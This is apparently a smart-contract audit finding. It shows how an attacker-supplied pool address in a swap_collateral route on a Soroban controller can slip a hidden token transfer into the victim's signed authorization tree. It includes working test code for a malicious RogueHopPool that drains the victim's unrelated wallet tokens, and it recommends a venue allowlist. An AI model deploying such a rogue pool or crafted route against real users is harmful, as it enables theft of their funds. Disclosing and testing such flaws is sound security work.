### Title
Arbitrary route venue can steal unrelated wallet tokens through the caller’s authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
An unprivileged attacker can craft a controller strategy route whose pool address is an attacker-controlled contract; when the victim submits the simulated authorization tree, that contract can add an unauthorized-looking nested `transfer` from the victim to the attacker and steal tokens unrelated to the swap. [1](#0-0) 

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` accepts caller-controlled opaque `swap` bytes and requires only owner or delegate authorization. [2](#0-1) [3](#0-2) 

The controller forwards those bytes to the configured router after authorizing one exact transfer from the controller, then validates only the controller’s measured input spend and positive output receipt. [4](#0-3)  Those checks do not restrict which contracts the route invokes. [5](#0-4) 

The router payload’s `assets` registry includes pool addresses supplied by the caller, while program decoding checks only index bounds and structural properties. [6](#0-5) [7](#0-6)  A swap instruction converts the caller-selected `idx_a` entry into `SwapHop.pool` and dispatches it to the selected venue adapter. [8](#0-7) 

For example, the Soroswap adapter invokes `get_reserves` and `swap` directly on the payload-supplied pool address. [9](#0-8) [10](#0-9)  A malicious pool can therefore execute attacker-controlled code during the victim’s controller call and invoke `unrelated_token.transfer(victim, attacker, amount)`. [11](#0-10) 

Soroban simulation records that nested transfer as a child of the victim’s `swap_collateral` authorization, so a victim who submits the generated tree authorizes both the strategy and the theft. [12](#0-11)  The test demonstrates that the enforced transaction succeeds when that generated child is present and leaves the victim with zero units of the unrelated wallet token. [13](#0-12) 

### Impact Explanation
This permits theft of arbitrary user-held token balances beyond the collateral amount routed through the controller. [14](#0-13)  The malicious venue can preserve route validity by returning sufficient output token, allowing the router’s positive-output check, the controller’s measured-output check, and the final account-risk checks to pass. [15](#0-14) [16](#0-15) 

### Likelihood Explanation
The attacker does not need protocol privileges, leaked keys, or control of governance; they need to cause the victim to submit a crafted route, such as through a malicious quote or interface. [17](#0-16)  The authorization tree does contain the stealing transfer, so exploitation depends on the victim signing a simulated tree rather than on an authorization bypass. [18](#0-17)  This is still a practical route-validation vulnerability because `swap` is opaque bytes and the contract accepts arbitrary venue addresses without binding the signed invocation to an approved venue set. [6](#0-5) 

### Recommendation
Do not let route payloads select arbitrary venue contracts. Maintain an on-chain allowlist or registry of approved pool implementation addresses, verify `SwapHop.pool` against that registry before dispatch, and govern additions through the existing timelock. [19](#0-18)  As defense in depth, clients should reject authorization trees containing any child outside the expected controller pull and router settlement calls. [20](#0-19) 

### Proof of Concept
The repository already contains an executable reproduction in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`. [1](#0-0) 

1. Deploy a malicious `RogueHopPool` that stores `(victim, wallet_token, attacker, amount)`. [21](#0-20) 
2. Build a route whose pool address is that contract and call:
   `swap_collateral(victim, victim_account_id, USDC_key, amount, ETH_key, route)`. [22](#0-21) 
3. During the route execution, the pool calls `wallet_token.transfer(victim, attacker, amount)`. [11](#0-10) 
4. Simulation records the theft as a child invocation under the victim’s `swap_collateral` authorization. [20](#0-19) 
5. Submitting that generated authorization tree succeeds: the attacker receives `WALLET_BALANCE`, the victim’s unrelated token balance becomes zero, and the victim still receives a valid swap output. [13](#0-12)

### Citations

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L55-70)
```rust
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L134-157)
```rust
    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-256)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/lib.rs (L280-302)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap.rs (L29-54)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/controller/src/strategies/swap.rs (L74-83)
```rust
/// Returns the output balance increase; rejects zero or negative receipts.
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
```

**File:** contracts/swap-aggregator/src/types.rs (L38-44)
```rust
pub struct StrategyPayload {
    /// Amount registry: min-out, fixed inputs, burn floors, mint min-shares.
    pub amounts: Vec<i128>,
    /// Address registry: tokens, pools, and LP share tokens.
    pub assets: Vec<Address>,
    /// Packed program: header, instruction records, split weights.
    pub ops: Bytes,
```

**File:** contracts/swap-aggregator/src/program.rs (L281-292)
```rust
            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
                }
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-166)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L51-58)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let token_in_is_0 = ctx.hop.token_in < ctx.hop.token_out;

    let no_args: Vec<Val> = vec![ctx.env];
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L71-88)
```rust
    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
}
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L42-56)
```rust
    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }
```
